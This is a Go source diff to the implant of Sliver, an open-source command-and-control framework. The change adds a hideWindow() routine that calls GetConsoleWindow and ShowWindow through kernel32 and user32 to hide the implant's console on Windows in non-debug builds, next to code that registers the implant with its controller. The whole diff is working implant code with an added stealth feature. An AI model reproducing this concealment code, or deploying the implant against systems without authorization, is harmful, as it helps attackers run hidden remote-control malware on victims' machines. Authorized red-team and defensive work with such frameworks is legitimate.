@@ -28,6 +28,12 @@ import (
 	"os"
 	"os/user"
 	"runtime"
+
+	// {{if eq .Config.GOOS "windows"}}
+	// {{if .Config.Debug}} {{else}}
+	"syscall"
+	// {{end}}
+	// {{end}}
 	"time"
 
 	// {{if .Config.Debug}}{{else}}
@@ -41,6 +47,7 @@ import (
 	// {{if eq .Config.GOOS "windows"}}
 	"github.com/bishopfox/sliver/implant/sliver/priv"
 	"github.com/bishopfox/sliver/implant/sliver/syscalls"
+
 	// {{end}}
 
 	consts "github.com/bishopfox/sliver/implant/sliver/constants"
@@ -131,6 +138,12 @@ func DllUnregisterServer() { main() }
 
 func main() {
 
+	// {{if eq .Config.GOOS "windows"}}
+	// {{if .Config.Debug}} {{else}}
+	hideWindow()
+	// {{end}}
+	// {{end}}
+
 	// {{if .Config.Debug}}
 	log.SetFlags(log.LstdFlags | log.Lshortfile)
 	// {{else}}
@@ -157,8 +170,19 @@ func main() {
 	// {{end}}
 }
 
-func mainLoop(connection *transports.Connection) {
+// {{if eq .Config.GOOS "windows"}}
+// {{if .Config.Debug}} {{else}}
+func hideWindow() {
+	getConsoleWindowProc := syscall.NewLazyDLL("kernel32.dll").NewProc("GetConsoleWindow")
+	showWindowProc := syscall.NewLazyDLL("user32.dll").NewProc("ShowWindow")
+	hWindow, _, _ := getConsoleWindowProc.Call()
+	showWindowProc.Call(hWindow, uintptr(0))
+}
 
+// {{end}}
+// {{end}}
+
+func mainLoop(connection *transports.Connection) {
 	connection.Send <- getRegisterSliver() // Send registration information
 
 	// Reconnect active pivots
